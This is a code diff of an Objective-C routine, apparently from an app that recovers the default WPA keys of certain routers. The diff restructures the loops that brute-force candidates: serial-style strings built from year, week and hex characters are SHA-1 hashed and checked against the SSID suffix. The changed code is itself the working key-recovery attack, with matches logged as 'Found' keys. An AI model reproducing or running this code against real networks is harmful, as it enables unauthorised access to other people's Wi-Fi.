@@ -179,91 +179,81 @@ void sha1(const char* str)
 
     [self.resultArray removeAllObjects];
 
-    int yearList[8] = { 5,6,7,8,9,10,11,12 };
-
-    NSMutableArray *weekList = [NSMutableArray array];
-    for(int i=1; i < 53; i++)
-    {
-        [weekList addObject:@(i)];
-    }
-
     NSLog(@"Possible keys for SSID ending %@:", ssid_end.uppercaseString);
     unsigned int count = 0;
 
-    for (int yearIndex = 0; yearIndex < 8; yearIndex++)
+    for (int year = 0; year <= 16; year++)
     {
-        int year = yearList[yearIndex];
-
         NSString* logStr = [NSString stringWithFormat:@"Trying year 20%02d", year];
         [self logTextFromBackground:logStr];
 
-        for (NSNumber *w in weekList) // 1..52
+        for (int week = 1; week <= 53; week++)
         {
             NSMutableArray* parameterArray = [[NSMutableArray alloc] init];
             [self performSelectorOnMainThread:@selector(isStopRequested:) withObject:parameterArray waitUntilDone:YES];
-            if ([parameterArray count] == 1)
+
+            if ([parameterArray count] != 1)
             {
-                int result = [[parameterArray objectAtIndex: 0] intValue];
-                if (result)
+                continue;
+            }
+            
+            int result = [[parameterArray objectAtIndex: 0] intValue];
+
+            if (!result)
+            {
+                return;
+            }
+
+            for (int char1 = 0; char1 < 36; char1++)
+            {
+                for (int char2 = 0; char2 < 36; char2++)
                 {
-                    int week = [w intValue];
-
-                    for (int char1 = 0; char1 < 36; char1++)
+                    for (int char3 = 0; char3 < 36; char3++)
                     {
-                        for (int char2 = 0; char2 < 36; char2++)
+                        char buff[14];
+                        buff[0] = 'C';
+                        buff[1] = 'P';
+                        buff[2] = digitToChar(year / 10);
+                        buff[3] = digitToChar(year % 10);
+                        buff[4] = digitToChar(week / 10);
+                        buff[5] = digitToChar(week % 10);
+                        intToHex(charset[char1]);
+                        buff[6] = hexResult[0];
+                        buff[7] = hexResult[1];
+                        intToHex(charset[char2]);
+                        buff[8] = hexResult[0];
+                        buff[9] = hexResult[1];
+                        intToHex(charset[char3]);
+                        buff[10] = hexResult[0];
+                        buff[11] = hexResult[1];
+                        buff[12] = '\0';
+
+                        sha1(buff);
+
+                        BOOL isEqual = YES;
+                        int index = 0;
+                        while (ssid[index] != '\0')
                         {
-                            for (int char3 = 0; char3 < 36; char3++)
+                            if (ssid[index] != shaResult[offset + index])
                             {
-                                char buff[14];
-                                buff[0] = 'C';
-                                buff[1] = 'P';
-                                buff[2] = digitToChar(year / 10);
-                                buff[3] = digitToChar(year % 10);
-                                buff[4] = digitToChar(week / 10);
-                                buff[5] = digitToChar(week % 10);
-                                intToHex(charset[char1]);
-                                buff[6] = hexResult[0];
-                                buff[7] = hexResult[1];
-                                intToHex(charset[char2]);
-                                buff[8] = hexResult[0];
-                                buff[9] = hexResult[1];
-                                intToHex(charset[char3]);
-                                buff[10] = hexResult[0];
-                                buff[11] = hexResult[1];
-                                buff[12] = '\0';
-
-                                sha1(buff);
-
-                                BOOL isEqual = YES;
-                                int index = 0;
-                                while (ssid[index] != '\0')
-                                {
-                                    if (ssid[index] != shaResult[offset + index])
-                                    {
-                                        isEqual = NO;
-                                    }
-                                    index++;
-                                }
-
-                                if (isEqual)
-                                {
-                                    shaResult[10] = '\0';
-                                    NSString *resStr = [NSString stringWithCString:shaResult encoding:NSASCIIStringEncoding];
-
-                                    NSString* subLogStr = [NSString stringWithFormat:@"Found: %@", resStr];
-                                    NSLog(@"%@", subLogStr);
-                                    [self logTextFromBackground:subLogStr];
-                                    [self.resultArray addObject:resStr];
-
-                                    count += 1;
-                                }
+                                isEqual = NO;
                             }
+                            index++;
+                        }
+
+                        if (isEqual)
+                        {
+                            shaResult[10] = '\0';
+                            NSString *resStr = [NSString stringWithCString:shaResult encoding:NSASCIIStringEncoding];
+
+                            NSString* subLogStr = [NSString stringWithFormat:@"Found: %@", resStr];
+                            NSLog(@"%@", subLogStr);
+                            [self logTextFromBackground:subLogStr];
+                            [self.resultArray addObject:resStr];
+
+                            count++;
                         }
                     }
-                }
-                else
-                {
-                    return;
                 }
             }
         }
